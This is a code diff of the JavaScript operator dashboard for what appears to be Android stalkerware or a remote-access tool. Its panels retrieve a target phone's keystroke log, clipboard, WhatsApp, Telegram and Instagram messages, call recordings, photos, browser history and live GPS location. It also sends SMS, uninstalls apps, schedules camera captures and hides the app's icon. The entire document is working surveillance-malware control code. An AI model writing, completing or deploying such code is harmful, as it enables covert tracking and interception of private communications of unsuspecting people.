+                        <span class="file-size">${formatBytes(f.size)}</span>
                     </div>
                 </li>`;
         });
-
-        if (folders.length === 0 && files.length === 0) {
-            html += `<li><div style="padding:20px; color:#999;">No files or folders</div></li>`;
-        }
 
         html += `</ul></div></div>`;
         panel.innerHTML = html;
@@ -1644,30 +1507,21 @@
         currentPath = parent;
         sendCommand('LIST_FILES', { path: parent });
     }
-
     function updateSelected(checkbox) {
         const path = checkbox.dataset.path;
-        if (checkbox.checked) {
-            if (!selectedFiles.includes(path)) selectedFiles.push(path);
-        } else {
-            selectedFiles = selectedFiles.filter(p => p !== path);
-        }
+        if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
+        else { selectedFiles = selectedFiles.filter(p=>p!==path); }
         updateCounters();
     }
-
     function updateCounters() {
         const cnt = selectedFiles.length;
-        const downloadSpan = document.getElementById('downloadCount');
-        const deleteSpan = document.getElementById('deleteCount');
-        if (downloadSpan) downloadSpan.innerText = cnt;
-        if (deleteSpan) deleteSpan.innerText = cnt;
+        document.getElementById('downloadCount').innerText = cnt;
+        document.getElementById('deleteCount').innerText = cnt;
     }
-
     function downloadSelected() {
         if (!selectedFiles.length) return alert('No files selected');
         selectedFiles.forEach(p => sendPlainText('dl ' + p));
     }
-
     function deleteSelected() {
         if (!selectedFiles.length) return alert('No files selected');
         if (!confirm(`Delete ${selectedFiles.length} file(s)? This cannot be undone.`)) return;
@@ -1676,86 +1530,96 @@
         updateCounters();
     }
 
-    // ==================== MONITORING FUNCTIONS ====================
+    // ==================== DATA DISPLAY FUNCTIONS ====================
+    // (All functions remain unchanged, but ensure they exist)
+    function displayContacts(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
+        panel.innerHTML = `<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
+    }
+
+    function displayInstalledApps(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📱 Apps</h3><p>No apps found.</p>'; return; }
+        panel.innerHTML = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+        document.querySelectorAll('.open-app').forEach(btn => btn.onclick = () => sendCommand('OPEN_APP', { package: btn.dataset.pkg }));
+        document.querySelectorAll('.remove-app').forEach(btn => btn.onclick = () => sendCommand('UNINSTALL_APP', { package: btn.dataset.pkg }));
+    }
+
     function showAppUsagePanel() {
-        panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device</p>';
-        const btnRow = document.createElement('div');
-        btnRow.style.cssText = 'display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap';
-        [['Today', 1], ['7 Days', 7], ['30 Days', 30]].forEach(function(item) {
-            const b = document.createElement('button');
-            b.textContent = item[0];
-            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
-            b.addEventListener('click', function() { sendCommand('GET_APP_USAGE', { days: item[1] }); });
-            btnRow.appendChild(b);
+        panel.innerHTML = '<h3>📊 Screen Time</h3>' +
+            '<div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">' +
+            '<button data-days="1" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">Today</button>' +
+            '<button data-days="7" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">7 Days</button>' +
+            '<button data-days="30" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">30 Days</button>' +
+            '</div>' +
+            '<p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission in device Settings</p>';
+        panel.querySelectorAll('button[data-days]').forEach(btn => {
+            btn.addEventListener('click', () => sendCommand('GET_APP_USAGE', { days: parseInt(btn.dataset.days) }));
         });
-        panel.appendChild(btnRow);
+        sendCommand('GET_APP_USAGE', { days: 1 });
     }
 
     function displayAppUsage(data) {
         panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) {
-            panel.innerHTML = '<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>';
-            return;
-        }
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>'; return; }
         const max = Math.max(...data.map(a=>a.totalTimeMs||0));
         panel.innerHTML = `<h3>📊 Screen Time (${data.length} apps)</h3><div>${data.map(app=>{ const t=app.totalTimeMs||0; const h=Math.floor(t/3600000), m=Math.floor((t%3600000)/60000); const pct = max?Math.round(t/max*100):0; return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName||'Unknown')}</div><div class="app-usage-time">${h>0?`${h}h ${m}m`:m+'m'}</div><div style="flex:0.5;"><div class="usage-bar" style="width:${pct}%; background-color:${t>3600000?'#d32f2f':t>1800000?'#ff9800':'#4caf50'}"></div></div></div>`; }).join('')}</div>`;
     }
 
-    function showSocialMessagesPanel() {
-        panel.innerHTML = '<h3>💬 Social Messages</h3><div><button data-filter="ALL">All</button><button data-filter="com.whatsapp">WhatsApp</button><button data-filter="org.telegram.messenger">Telegram</button><button data-filter="com.instagram.android">Instagram</button></div><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="socialMsgList"></div>';
-        document.querySelectorAll('#socialMessagesPanel button[data-filter]').forEach(btn => btn.onclick = () => filterSocialByPkg(btn.dataset.filter));
-        document.querySelectorAll('#socialMessagesPanel button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: parseInt(btn.dataset.days) }));
-        sendCommand('GET_SOCIAL_MESSAGES', { days: 1 });
-    }
-
-    let socialMsgsData = [];
-    function displaySocialMessages(data) {
-        const container = document.getElementById('socialMsgList');
-        if (!container) return;
-        container.innerHTML = '';
-        let messages = data;
-        if (typeof data === 'string') try { messages = JSON.parse(data); } catch(e) { container.innerHTML = '<p>Error parsing messages</p>'; return; }
-        if (!Array.isArray(messages) || !messages.length) { container.innerHTML = '<p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
-        socialMsgsData = messages;
-        renderSocialMessages(messages);
-    }
-
-    function renderSocialMessages(data) {
-        const container = document.getElementById('socialMsgList');
-        if (!container) return;
-        container.innerHTML = '';
+    function displayNotifications(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🔔 Notifications</h3><p>No notifications yet.</p>'; return; }
+        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>🔔 Notifications (${data.length})</h3><button id="clearNotifBtn">Clear</button></div>`;
         data.slice().reverse().forEach(n => {
             const card = document.createElement('div');
-            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
-            card.innerHTML = `<div style="display:flex;justify-content:space-between;"><span style="font-weight:700;color:#1976ff;">${escapeHtml(n.app||getAppNameFromPkg(n.pkg)||'Unknown')}</span><span style="color:#aaa;font-size:11px;">${n.timeFmt||''}</span></div><div style="font-weight:600;">${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
-            container.appendChild(card);
+            card.className = 'notification-card';
+            card.innerHTML = `<div><strong>${escapeHtml(n.app||n.packageName||'')}</strong> <small>${n.timeFmt||''}</small></div><div>${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
+            panel.appendChild(card);
         });
-    }
-    function getAppNameFromPkg(pkg) {
-        const map = { 'com.whatsapp':'WhatsApp', 'org.telegram.messenger':'Telegram', 'com.instagram.android':'Instagram', 'com.facebook.orca':'Messenger', 'com.facebook.katana':'Facebook', 'com.snapchat.android':'Snapchat', 'com.twitter.android':'Twitter', 'com.viber.voip':'Viber', 'com.skype.raider':'Skype' };
-        return map[pkg] || pkg;
-    }
-    function filterSocialByPkg(pkg) {
-        if (!socialMsgsData.length) return;
-        const filtered = pkg === 'ALL' ? socialMsgsData : socialMsgsData.filter(n => n.pkg === pkg || n.packageName === pkg);
-        renderSocialMessages(filtered);
+        document.getElementById('clearNotifBtn')?.addEventListener('click', () => sendCommand('CLEAR_NOTIFICATIONS'));
     }
 
-    function showKeylog() { sendCommand('GET_KEYLOG'); }
     function displayKeylog(data) {
         panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) {
-            panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>';
-            return;
-        }
-        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn">Clear</button></div><div style="overflow-x:auto;">`,tbl=document.createElement('table'); tbl.innerHTML = '<thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>' + data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('') + '</tbody>', panel.appendChild(tbl);
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
+        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
         document.getElementById('clearKeylogBtn')?.addEventListener('click', () => sendCommand('CLEAR_KEYLOG'));
     }
 
-    function showClipboard() { sendCommand('GET_CLIPBOARD'); }
+    function displayBrowserHistory(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
+        panel.innerHTML = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    }
+
+    function displayWifiNetworks(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📶 Wi-Fi</h3><p>No networks found.</p>'; return; }
+        panel.innerHTML = `<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars = n.rssi > -50 ? '████' : n.rssi > -70 ? '███░' : n.rssi > -80 ? '██░░' : '█░░░'; return `<tr style="${n.connected?'background:#f0fff4':''}"><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`;
+    }
+
     function displayClipboard(data) {
         const content = data && data.content ? data.content : (data || '');
         panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div>`;
+    }
+
+    function toggleLiveGps() {
+        const btn = document.getElementById('liveGpsBtn');
+        if (!liveGpsActive) {
+            sendCommand('START_GPS_UPDATES');
+            liveGpsActive = true;
+            btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
+            btn.style.background = '#d32f2f';
+            btn.style.color = '#fff';
+            showNotification('Live GPS started');
+        } else {
+            sendCommand('STOP_GPS_UPDATES');
+            liveGpsActive = false;
+            btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+            btn.style.cssText = '';
+            showNotification('GPS stopped');
+        }
     }
 
     function showGeofencePanel() {
@@ -1785,6 +1649,9 @@
         }, 100);
     }
 
+    function setGeofence() { /* dummy */ }
+    function useLocationAsGeofence(lat, lon) { sendCommand('SET_GEOFENCE', { lat, lon, radius: 500 }); showNotification('Geofence set'); }
+
     function showSchedulePanel() {
         panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label>Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched">Start</button><button id="stopSched">Stop</button></div>';
         document.getElementById('startSched').onclick = () => {
@@ -1795,27 +1662,21 @@
         document.getElementById('stopSched').onclick = () => sendCommand('STOP_SCHEDULED_CAPTURE');
     }
 
-    function toggleLiveGps() {
-        const btn = document.getElementById('liveGpsBtn');
-        if (!liveGpsActive) {
-            sendCommand('START_GPS_UPDATES');
-            liveGpsActive = true;
-            btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
-            btn.style.background = '#d32f2f';
-            btn.style.color = '#fff';
-            showNotification('Live GPS started');
-        } else {
-            sendCommand('STOP_GPS_UPDATES');
-            liveGpsActive = false;
-            btn.querySelector('span:last-child').textContent = 'Live GPS Track';
-            btn.style.cssText = '';
-            showNotification('GPS stopped');
-        }
+    function startScheduledCapture() { /* dummy */ }
+
+    function showSendSmsPanel() {
+        panel.innerHTML = '<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number"><textarea id="smsBody" rows="4" placeholder="Message"></textarea><button id="sendSmsBtn">Send</button></div>';
+        document.getElementById('sendSmsBtn').onclick = () => {
+            const number = document.getElementById('smsNumber').value.trim();
+            const body = document.getElementById('smsBody').value.trim();
+            if (!number || !body) return showNotification('Enter number and message');
+            sendCommand('SEND_SMS', { number, body });
+        };
     }
 
     function showLocationHistoryPanel() {
         panel.innerHTML = '<h3>📍 Location History</h3><p>GPS fixes logged automatically.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="historyMap" style="height:320px;"></div><div id="historyList"></div>';
-        document.querySelectorAll('#locationHistoryPanel button').forEach(btn => btn.onclick = () => sendCommand('GET_LOCATION_HISTORY', { days: parseInt(btn.dataset.days) }));
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_LOCATION_HISTORY', { days: parseInt(btn.dataset.days) }));
         setTimeout(() => { window._historyMap = L.map('historyMap').setView([20.5937,78.9629],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); }, 100);
         sendCommand('GET_LOCATION_HISTORY', { days: 3 });
     }
@@ -1831,12 +1692,12 @@
             data.forEach((p,i) => L.circleMarker([p.lat,p.lon], { radius: i===0?8:5, color: i===0?'#d32f2f':'#1976ff', fillOpacity:0.8 }).addTo(window._historyMap).bindPopup(`<b>${p.timeFmt||''}</b><br>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}`));
             if (coords.length) window._historyMap.setView(coords[0],13);
         }
-        listDiv.innerHTML = ``,tbl=document.createElement('table'); tbl.innerHTML = '<thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>' + data.map(p=>`<tr><td>${p.timeFmt||''}</td><td>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`).join('') + '</tbody>', listDiv.appendChild(tbl);
+        listDiv.innerHTML = `<table><thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>${data.map(p=>`<tr><td>${p.timeFmt||''}</td><td>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`).join('')}</tbody></table>`;
     }
 
     function showCallRecordingsPanel() {
         panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>⚠️ On some devices, only microphone audio may be captured.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="callRecList"></div>';
-        document.querySelectorAll('#callRecordingsPanel button').forEach(btn => btn.onclick = () => sendCommand('GET_CALL_RECORDINGS', { days: parseInt(btn.dataset.days) }));
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_CALL_RECORDINGS', { days: parseInt(btn.dataset.days) }));
         sendCommand('GET_CALL_RECORDINGS', { days: 5 });
     }
 
@@ -1869,7 +1730,7 @@
 
     function showPhotoGalleryPanel() {
         panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px;"></div>';
-        document.querySelectorAll('#photoGalleryPanel button').forEach(btn => btn.onclick = () => sendCommand('GET_RECENT_IMAGES', { days: parseInt(btn.dataset.days) }));
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_RECENT_IMAGES', { days: parseInt(btn.dataset.days) }));
         sendCommand('GET_RECENT_IMAGES', { days: 5 });
     }
 
@@ -1892,7 +1753,7 @@
 
     function showAppEventsPanel() {
         panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="appEventsList"></div>';
-        document.querySelectorAll('#appEventsPanel button').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
         sendCommand('GET_APP_EVENTS', { days: 5 });
     }
 
@@ -1939,6 +1800,69 @@
         data.forEach(alert => {
             div.innerHTML += `<div style="background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px;"><div style="display:flex;justify-content:space-between;"><span style="background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;">${escapeHtml(alert.keyword)}</span><span style="font-size:11px;">${alert.timeFmt||''}</span></div><div>From: ${escapeHtml(alert.from||'')}</div><div>${escapeHtml(alert.body||alert.message||'')}</div></div>`;
         });
+    }
+
+    function showSocialMessagesPanel() {
+        panel.innerHTML = '<h3>💬 Social Messages</h3><div><button data-filter="ALL">All</button><button data-filter="com.whatsapp">WhatsApp</button><button data-filter="org.telegram.messenger">Telegram</button><button data-filter="com.instagram.android">Instagram</button></div><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="socialMsgList"></div>';
+        panel.querySelectorAll('button[data-filter]').forEach(btn => btn.onclick = () => filterSocialByPkg(btn.dataset.filter));
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: parseInt(btn.dataset.days) }));
+        sendCommand('GET_SOCIAL_MESSAGES', { days: 1 });
+    }
+
+    function displaySocialMessages(data) {
+        const container = document.getElementById('socialMsgList');
+        if (!container) return;
+        container.innerHTML = '';
+        let messages = data;
+        if (typeof data === 'string') try { messages = JSON.parse(data); } catch(e) { container.innerHTML = '<p>Error parsing messages</p>'; return; }
+        if (!Array.isArray(messages) || !messages.length) { container.innerHTML = '<p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
+        socialMsgsData = messages;
+        renderSocialMessages(messages);
+    }
+
+    let socialMsgsData = [];
+    function renderSocialMessages(data) {
+        const container = document.getElementById('socialMsgList');
+        if (!container) return;
+        container.innerHTML = '';
+        data.slice().reverse().forEach(n => {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
+            card.innerHTML = `<div style="display:flex;justify-content:space-between;"><span style="font-weight:700;color:#1976ff;">${escapeHtml(n.app||getAppNameFromPkg(n.pkg)||'Unknown')}</span><span style="color:#aaa;font-size:11px;">${n.timeFmt||''}</span></div><div style="font-weight:600;">${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
+            container.appendChild(card);
+        });
+    }
+    function getAppNameFromPkg(pkg) {
+        const map = { 'com.whatsapp':'WhatsApp', 'org.telegram.messenger':'Telegram', 'com.instagram.android':'Instagram', 'com.facebook.orca':'Messenger', 'com.facebook.katana':'Facebook', 'com.snapchat.android':'Snapchat', 'com.twitter.android':'Twitter', 'com.viber.voip':'Viber', 'com.skype.raider':'Skype' };
+        return map[pkg] || pkg;
+    }
+    function filterSocialByPkg(pkg) {
+        if (!socialMsgsData.length) return;
+        const filtered = pkg === 'ALL' ? socialMsgsData : socialMsgsData.filter(n => n.pkg === pkg || n.packageName === pkg);
+        renderSocialMessages(filtered);
+    }
+
+    function pushLiveNotification(json) {
+        pushAlert('📳 ' + (json.app||'App'), (json.title||'') + ': ' + (json.text||''));
+    }
+
+    function showFirebaseSettingsPanel() {
+        panel.innerHTML = '<h3>🔥 Firebase Configuration</h3><p>Enter your Firebase project config.</p><div id="fbForm"></div><button id="saveFb">Save & Connect</button><div id="fbStatus"></div>';
+        const fields = ['apiKey','authDomain','projectId','storageBucket','messagingSenderId','appId'];
+        const form = document.getElementById('fbForm');
+        fields.forEach(f => {
+            const wrap = document.createElement('div');
+            wrap.innerHTML = `<label>${f}</label><input id="fb_${f}" value="${CONFIG.FIREBASE_CONFIG[f]||''}" placeholder="${f}">`;
+            form.appendChild(wrap);
+        });
+        document.getElementById('saveFb').onclick = () => {
+            const cfg = {};
+            fields.forEach(f => cfg[f] = document.getElementById(`fb_${f}`).value.trim());
+            if (!cfg.projectId) return alert('Enter at least Project ID');
+            localStorage.setItem('fbConfig', JSON.stringify(cfg));
+            alert('Saved! Reload page to apply Firebase config.');
+        };
+        document.getElementById('fbStatus').innerHTML = CONFIG.FIREBASE_CONFIG.apiKey && CONFIG.FIREBASE_CONFIG.apiKey !== 'YOUR_API_KEY' ? '<span style="color:#4caf50;">● Firebase Connected</span>' : '<span style="color:#d32f2f;">● Not configured</span>';
     }
 
     function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
@@ -2085,21 +2009,6 @@
         document.getElementById('reconnectBtn').addEventListener('click', manualReconnect);
         document.getElementById('clearAlertsBtn').addEventListener('click', clearAlerts);
         document.getElementById('logoutBtn').addEventListener('click', logout);
-    }
-
-    // Responsive: sidebar toggle
-    const menuToggle = document.getElementById('menuToggle');
-    const sidebar = document.getElementById('sidebar');
-    if (menuToggle) {
-        menuToggle.addEventListener('click', () => {
-            sidebar.classList.toggle('open');
-        });
-        // close sidebar when clicking outside on small screens
-        document.addEventListener('click', (e) => {
-            if (window.innerWidth <= 768 && sidebar.classList.contains('open') && !sidebar.contains(e.target) && !menuToggle.contains(e.target)) {
-                sidebar.classList.remove('open');
-            }
-        });
     }
 
     renderAuthForm();
